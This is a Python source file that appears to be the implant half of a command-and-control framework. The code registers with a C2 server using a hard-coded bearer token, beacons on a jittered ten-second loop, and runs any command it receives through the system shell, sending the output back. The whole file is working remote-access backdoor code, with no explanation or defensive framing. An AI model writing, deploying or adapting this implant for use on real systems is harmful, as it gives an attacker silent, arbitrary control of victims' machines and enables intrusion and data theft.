import requests, time, subprocess, socket, random, uuid
#this is tag 1.2
SERVER_URL = "http://127.0.0.1:5000"
AGENT_ID = f"agent_{uuid.getnode()}"
HOSTNAME = socket.gethostname()
HEADERS = {"Authorization": "Bearer super_secret_c2_token_2026"}

def register():
    try:
        if requests.post(f"{SERVER_URL}/api/register", json={"agent_id": AGENT_ID, "hostname": HOSTNAME}, headers=HEADERS).status_code == 200:
            print(f"[*] Registered as {AGENT_ID}")
            return True
    except: pass
    return False

def beacon():
    while True:
        try:
            response = requests.get(f"{SERVER_URL}/api/tasks/{AGENT_ID}", headers=HEADERS)
            if response.status_code == 200:
                data = response.json()
                command = data.get("command")
                
                if command and command != "sleep":
                    print(f"[*] Executing: {command}")
                    
                    try:
                        res = subprocess.run(command, shell=True, capture_output=True, text=True)
                        output = res.stdout + res.stderr
                        output = output if output else "Command executed silently."
                    except Exception as e:
                        output = str(e)
                        
                    requests.post(f"{SERVER_URL}/api/results", json={"task_id": data.get("task_id"), "output": output}, headers=HEADERS)
        except: pass
        
        time.sleep(10 + random.uniform(-2, 2)) # 10 sec sleep + jitter

if __name__ == "__main__":
    while not register(): time.sleep(5)
    beacon()

